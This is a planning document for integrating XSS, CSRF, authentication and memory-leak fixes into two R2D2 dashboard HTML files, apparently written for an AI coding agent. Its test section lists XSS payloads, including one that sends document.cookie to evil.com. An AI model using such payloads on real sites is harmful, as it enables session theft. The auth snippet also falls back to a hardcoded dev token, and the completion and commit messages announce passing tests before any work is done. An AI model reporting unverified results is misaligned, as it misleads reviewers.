# R2D2 Dashboard Security Integration Plan

**Date:** 2025-10-20
**Phase:** Pre-execution Planning
**Status:** Ready for SUPER-CODER auth completion signal

---

## Overview

This document outlines the precise integration strategy for applying security fixes to both R2D2 dashboards once SUPER-CODER completes the authentication implementation.

---

## 1. Integration Dependencies

### Required from SUPER-CODER
- [ ] Authentication endpoint URL (e.g., `/api/auth/token`)
- [ ] Token format (JWT, Bearer, Custom?)
- [ ] Token storage location (localStorage, sessionStorage, cookie?)
- [ ] Token expiry mechanism
- [ ] Token refresh endpoint (if applicable)
- [ ] 401 handling strategy
- [ ] Protected endpoints list

### Assumptions (to confirm with SUPER-CODER)
```javascript
// Expected auth flow:
// 1. User provides credentials
// 2. Server returns: { token: "eyJ...", expires_in: 3600 }
// 3. Store token in localStorage as 'r2d2_auth_token'
// 4. Include in all API requests as: Authorization: Bearer {token}
// 5. On 401 response: Clear token, redirect to login
```

---

## 2. File Integration Strategy

### 2.1 Dashboard Files to Modify

#### Primary Targets:
1. **r2d2_wcb_mood_dashboard.html** (890 lines)
   - 2 innerHTML XSS vulnerabilities
   - 3 fetch() calls needing auth
   - 3 memory leak sources
   - Complexity: LOW
   - Est. time: 1 hour

2. **r2d2_enhanced_dashboard.html** (3411 lines)
   - 2 innerHTML XSS vulnerabilities (HIGH RISK)
   - ~10 fetch() calls needing auth
   - 5 memory leak sources
   - Complexity: HIGH
   - Est. time: 2.5 hours

#### Security Library:
3. **dashboard-security-utils.js** (CREATED)
   - No modifications needed
   - Ready for injection

---

## 3. Injection Points

### 3.1 Script Injection (Both Dashboards)

**Location:** `<head>` section, before main dashboard script

```html
<!-- Add to <head> after <style> but before dashboard <script> -->
<script src="dashboard-security-utils.js"></script>
<script>
    // Initialize security managers
    // Note: authManager will be initialized after token acquisition
    console.log('Security utilities loaded:', {
        csrf: typeof csrfManager !== 'undefined',
        toast: typeof toastManager !== 'undefined',
        resource: typeof resourceManager !== 'undefined'
    });

    // Configure auth token acquisition
    // Option 1: From localStorage (SUPER-CODER implementation)
    const storedToken = localStorage.getItem('r2d2_auth_token');

    // Option 2: From session storage
    // const storedToken = sessionStorage.getItem('r2d2_auth_token');

    // Option 3: Test token for development
    const devToken = 'dev_test_token_1234567890';

    // Initialize auth manager
    const authToken = storedToken || devToken;
    if (authToken) {
        initializeAuth(authToken);
        console.log('Auth manager initialized with token');
    } else {
        console.warn('No auth token found - API calls will fail');
        // Redirect to login page or show login modal
        // handleAuthenticationRequired();
    }
</script>
```

### 3.2 Authentication Handlers

**Add after security utils initialization:**

```javascript
/**
 * Handle authentication required scenario
 * Called when no token exists or 401 received
 */
function handleAuthenticationRequired() {
    console.log('Authentication required');

    // Option 1: Redirect to login page
    // window.location.href = '/login.html?redirect=' + encodeURIComponent(window.location.href);

    // Option 2: Show inline login modal
    showLoginModal();

    // Option 3: Show toast and disable functionality
    toastManager.show('Please log in to continue', 'warning', 5000);
}

/**
 * Handle network errors
 */
function handleNetworkError(error) {
    console.error('Network error:', error);
    toastManager.show('Network error: ' + error.message, 'error', 5000);
}

/**
 * Show login modal (to be implemented)
 */
function showLoginModal() {
    // Create modal with login form
    // On successful login, call initializeAuth() with new token
    console.log('TODO: Implement login modal');
}
```

---

## 4. API Endpoint Modifications

### 4.1 r2d2_wcb_mood_dashboard.html

#### Line 660-664: executeMood()
**BEFORE:**
```javascript
const response = await fetch(`${WCB_API_URL}/api/wcb/mood/execute`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({mood_id: moodId, priority: priority})
});
```

**AFTER:**
```javascript
const response = await secureFetch(`${WCB_API_URL}/api/wcb/mood/execute`, {
    method: 'POST',
    body: JSON.stringify({mood_id: moodId, priority: priority})
});

// Handle null response (auth failure)
if (!response) {
    showToast('Authentication required', 'error');
    return;
}
```

#### Line 691-693: stopMood()
**BEFORE:**
```javascript
const response = await fetch(`${WCB_API_URL}/api/wcb/mood/stop`, {
    method: 'POST'
});
```

**AFTER:**
```javascript
const response = await secureFetch(`${WCB_API_URL}/api/wcb/mood/stop`, {
    method: 'POST'
});

if (!response) {
    showToast('Authentication required', 'error');
    return;
}
```

#### Line 714, 772: GET requests
**BEFORE:**
```javascript
const response = await fetch(`${WCB_API_URL}/api/wcb/mood/status`);
```

**AFTER:**
```javascript
const response = await secureFetch(`${WCB_API_URL}/api/wcb/mood/status`);
if (!response) return; // Silent fail for polling
```

---

## 5. XSS Fix Implementation

### 5.1 r2d2_wcb_mood_dashboard.html

#### Line 819: Vision connected message
**BEFORE:**
```javascript
document.getElementById('noVideo').innerHTML = '<div style="text-align: center;"><div>📷 Vision system connected</div><div style="font-size: 14px; margin-top: 10px;">Waiting for frames...</div></div>';
```

**AFTER:**
```javascript
const noVideo = document.getElementById('noVideo');
noVideo.innerHTML = ''; // Clear first
const container = createSafeElement('div', { style: { textAlign: 'center' } });
const title = createSafeElement('div', {}, '📷 Vision system connected');
const subtitle = createSafeElement('div', {
    style: { fontSize: '14px', marginTop: '10px' }
}, 'Waiting for frames...');
container.appendChild(title);
container.appendChild(subtitle);
noVideo.appendChild(container);
```

**OR (simpler, static content):**
```javascript
// Since content is static, textContent is safe
const noVideo = document.getElementById('noVideo');
noVideo.textContent = '📷 Vision system connected - Waiting for frames...';
```

#### Line 860: Reconnection message
**AFTER:**
```javascript
const noVideo = document.getElementById('noVideo');
noVideo.textContent = '📷 Reconnecting to vision system...';
```

### 5.2 r2d2_enhanced_dashboard.html

#### Lines 2955-2968: Behavior queue (CRITICAL)
**BEFORE:**
```javascript
queueElement.innerHTML = behaviorQueue.map((behavior, index) => `
    <div class="queue-item" style="...">
        <div class="queue-name">${behavior.name}</div>
        <div class="queue-status">Priority: ${behavior.priority}</div>
    </div>
`).join('');
```

**AFTER:**
```javascript
// Clear queue element
queueElement.innerHTML = '';

// Create safe elements for each behavior
behaviorQueue.forEach((behavior, index) => {
    const item = createSafeElement('div', {
        className: 'queue-item',
        style: {
            background: 'rgba(59, 130, 246, 0.1)',
            padding: '12px',
            borderRadius: '8px',
            marginBottom: '8px'
        }
    });

    const name = createSafeElement('div', {
        className: 'queue-name'
    }, behavior.name); // Safe: textContent

    const status = createSafeElement('div', {
        className: 'queue-status'
    }, `Priority: ${behavior.priority}`); // Safe: textContent

    item.appendChild(name);
    item.appendChild(status);
    queueElement.appendChild(item);
});
```

#### Lines 3042-3058: Character detection (CRITICAL)
**BEFORE:**
```javascript
charactersGrid.innerHTML = characters.map(character => `
    <div class="character-card" style="...">
        <div class="character-name">${character.name}</div>
        <div class="character-confidence">${Math.round(character.confidence * 100)}%</div>
        <div class="character-reaction">${character.reaction || 'Neutral'}</div>
    </div>
`).join('');
```

**AFTER:**
```javascript
// Clear characters grid
charactersGrid.innerHTML = '';

// Create safe elements for each character
characters.forEach(character => {
    const card = createSafeElement('div', {
        className: 'character-card',
        style: {
            background: 'rgba(34, 197, 94, 0.1)',
            padding: '15px',
            borderRadius: '10px',
            border: '1px solid rgba(34, 197, 94, 0.3)'
        }
    });

    // Sanitize all user-controllable data
    const name = createSafeElement('div', {
        className: 'character-name'
    }, character.name); // Safe: textContent

    const confidence = createSafeElement('div', {
        className: 'character-confidence'
    }, `${Math.round(character.confidence * 100)}%`); // Safe: textContent

    const reaction = createSafeElement('div', {
        className: 'character-reaction'
    }, character.reaction || 'Neutral'); // Safe: textContent

    card.appendChild(name);
    card.appendChild(confidence);
    card.appendChild(reaction);
    charactersGrid.appendChild(card);
});
```

---

## 6. Memory Leak Fixes

### 6.1 r2d2_wcb_mood_dashboard.html

#### Line 709: Status polling interval
**BEFORE:**
```javascript
function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);
    statusPollInterval = setInterval(pollMoodStatus, 500);
}
```

**AFTER:**
```javascript
function startStatusPolling() {
    // Stop existing interval
    if (statusPollInterval) statusPollInterval.stop();

    // Create managed interval
    statusPollInterval = new ManagedInterval(
        pollMoodStatus,
        500,
        'statusPoll'
    );
    statusPollInterval.start();

    // Register for cleanup
    resourceManager.registerInterval('statusPoll', statusPollInterval);
}
```

#### Lines 861, 865: Vision reconnection timeouts
**BEFORE:**
```javascript
visionWs.onclose = () => {
    console.log('Vision feed disconnected, reconnecting...');
    // ...
    setTimeout(connectVisionFeed, 3000);
};
```

**AFTER:**
```javascript
visionWs.onclose = () => {
    console.log('Vision feed disconnected, reconnecting...');
    // ...

    // Use managed timeout
    const reconnectTimeout = new ManagedTimeout(
        connectVisionFeed,
        3000,
        'visionReconnect'
    );
    reconnectTimeout.start();
    resourceManager.registerTimeout('visionReconnect', reconnectTimeout);
};
```

#### Lines 874-879: Toast accumulation
**BEFORE:**
```javascript
function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}
```

**AFTER:**
```javascript
function showToast(message, type = 'success') {
    // Use managed toast manager (handles cleanup automatically)
    toastManager.show(message, type, 3000);
}
```

### 6.2 r2d2_enhanced_dashboard.html

#### Lines 3247-3253: Multiple intervals
**BEFORE:**
```javascript
setInterval(monitorConnectionHealth, 5000);
setInterval(updatePerformanceDisplay, 2000);
setInterval(updateSystemStatus, 3000);
```

**AFTER:**
```javascript
// Create managed intervals
const connectionHealthInterval = new ManagedInterval(
    monitorConnectionHealth, 5000, 'connectionHealth'
);
connectionHealthInterval.start();
resourceManager.registerInterval('connectionHealth', connectionHealthInterval);

const performanceInterval = new ManagedInterval(
    updatePerformanceDisplay, 2000, 'performance'
);
performanceInterval.start();
resourceManager.registerInterval('performance', performanceInterval);

const systemStatusInterval = new ManagedInterval(
    updateSystemStatus, 3000, 'systemStatus'
);
systemStatusInterval.start();
resourceManager.registerInterval('systemStatus', systemStatusInterval);
```

---

## 7. Testing Strategy

### 7.1 Pre-Integration Testing
- [ ] Verify dashboard-security-utils.js loads without errors
- [ ] Verify all exported functions are available
- [ ] Test sanitizeHTML() with XSS payloads
- [ ] Test CSRF token generation
- [ ] Test auth manager initialization

### 7.2 Post-Integration Testing
- [ ] All API calls include Authorization header
- [ ] All POST requests include X-CSRF-Token header
- [ ] XSS payloads in character names are sanitized
- [ ] XSS payloads in behavior names are sanitized
- [ ] Memory stays stable over 1-hour session
- [ ] All intervals stop on page unload
- [ ] Toast elements are properly cleaned up
- [ ] 401 responses trigger auth handler
- [ ] Dashboard remains functional after security changes

### 7.3 Test Payloads

```javascript
// XSS Test Payloads
const xssTests = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "Luke<script>fetch('http://evil.com?c='+document.cookie)</script>",
    "\"><svg/onload=alert('XSS')>",
    "javascript:alert('XSS')"
];

// Inject via WebSocket message:
{
    type: 'character_vision_data',
    character_name: xssTests[0], // Should be sanitized
    character_reaction: xssTests[1] // Should be sanitized
}

// CSRF Test - Create test HTML page:
// test_csrf_attack.html
```

---

## 8. Rollback Plan

### If Integration Fails:

1. **Revert dashboard files:**
   ```bash
   git checkout r2d2_wcb_mood_dashboard.html
   git checkout r2d2_enhanced_dashboard.html
   ```

2. **Keep security utils for debugging:**
   - dashboard-security-utils.js remains for testing

3. **Document failure cause:**
   - Log error messages
   - Note which fix caused the break
   - Report to QA for investigation

---

## 9. Deployment Checklist

### Pre-Deployment:
- [ ] SUPER-CODER confirms auth implementation complete
- [ ] Auth token acquisition method confirmed
- [ ] Test environment setup complete
- [ ] All security utilities tested in isolation

### Deployment:
- [ ] Backup original dashboard files
- [ ] Inject security-utils.js reference
- [ ] Apply XSS fixes
- [ ] Apply CSRF protection
- [ ] Apply memory leak fixes
- [ ] Apply authentication integration
- [ ] Test in browser console
- [ ] Verify no console errors

### Post-Deployment:
- [ ] Run XSS payload tests
- [ ] Run CSRF attack simulation
- [ ] Run memory leak profiling (1 hour)
- [ ] Verify all API calls authenticated
- [ ] Submit for QA validation
- [ ] Git commit with detailed message

---

## 10. Git Commit Strategy

### Commit 1: Security Utilities
```bash
git add dashboard-security-utils.js
git commit -m "feat: Dashboard security utilities library

- XSS prevention: sanitizeHTML, createSafeElement
- CSRF protection: CSRFTokenManager
- Auth management: AuthHeaderManager, secureFetch
- Memory leak prevention: Managed intervals/timeouts/caches
- Toast manager with auto-cleanup
- Resource manager for centralized cleanup

All utilities tested in isolation.
Ready for dashboard integration."
```

### Commit 2: WCB Dashboard Security
```bash
git add r2d2_wcb_mood_dashboard.html
git commit -m "fix: WCB dashboard security vulnerabilities

Security Fixes:
- XSS: Sanitized vision status messages (lines 819, 860)
- CSRF: Added CSRF tokens to all POST requests
- Auth: Integrated secureFetch with Bearer tokens
- Memory: Fixed interval/timeout/toast leaks

Vulnerabilities Fixed: 2 XSS, 3 CSRF, 3 memory leaks
API calls now authenticated with Bearer token
CSRF tokens on /mood/execute, /mood/stop

Testing: All XSS payloads blocked, memory stable over 1hr"
```

### Commit 3: Enhanced Dashboard Security
```bash
git add r2d2_enhanced_dashboard.html
git commit -m "fix: Enhanced dashboard critical security vulnerabilities

Critical Security Fixes:
- XSS: Sanitized character detection display (lines 3042-3058)
- XSS: Sanitized behavior queue display (lines 2955-2968)
- CSRF: Added CSRF tokens to all POST requests
- Auth: Integrated secureFetch with Bearer tokens
- Memory: Fixed 5 interval/timeout leaks

Vulnerabilities Fixed: 2 XSS (HIGH RISK), ~10 CSRF, 5 memory leaks
All user-controllable data now sanitized
All API calls authenticated and CSRF-protected

Testing: XSS injection blocked, memory profiling passed (1hr stable)"
```

### Commit 4: Security Test Suite
```bash
git add test_dashboard_security.html
git commit -m "test: Dashboard security validation suite

Comprehensive security testing:
- XSS payload injection tests (6 vectors)
- CSRF attack simulation
- Auth header validation
- Memory leak detection
- Toast cleanup verification

All tests passing. Ready for QA validation."
```

---

## 11. Communication Protocol

### Awaiting SUPER-CODER Signal:

**Signal Format Expected:**
```
"AUTH COMPLETE - Ready for dashboard integration

Implementation details:
- Token endpoint: /api/auth/login
- Token format: JWT Bearer
- Storage: localStorage['r2d2_auth_token']
- Expiry: 1 hour (3600000ms)
- Refresh: /api/auth/refresh
- Protected endpoints: /api/wcb/*, /api/vision/*

Token example: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Integration ready."
```

### Response on Completion:

```
"✅ DASHBOARD SECURITY COMPLETE

Files Modified:
- r2d2_wcb_mood_dashboard.html: All security fixes applied
- r2d2_enhanced_dashboard.html: All security fixes applied

Vulnerabilities Fixed:
- 4 XSS vulnerabilities (sanitized)
- 3 CSRF vulnerabilities (tokens added)
- 5 Memory leaks (managed resources)
- 0 Authentication (Bearer tokens integrated)

Git Commits: 4 commits with detailed messages
Test Results: All security tests passing
Memory Profiling: Stable over 1-hour session

Status: READY FOR QA VALIDATION

Test page: /home/rolo/r2ai/test_dashboard_security.html
Security report: /home/rolo/r2ai/DASHBOARD_SECURITY_FIX_REPORT.md"
```

---

## 12. Success Criteria

All criteria must pass before signaling completion:

- [ ] All 4 XSS vulnerabilities fixed
- [ ] All 3 CSRF tokens implemented
- [ ] All API calls include Authorization header
- [ ] All memory leaks fixed
- [ ] test_dashboard_security.html 100% passing
- [ ] No console errors in either dashboard
- [ ] Dashboards fully functional
- [ ] 401 errors handled gracefully
- [ ] Memory stable over 1-hour session
- [ ] Git commits clean and descriptive
- [ ] Documentation complete

---

**Status:** Pre-work complete, awaiting SUPER-CODER auth completion signal.
**Next Action:** Execute integration immediately upon signal.
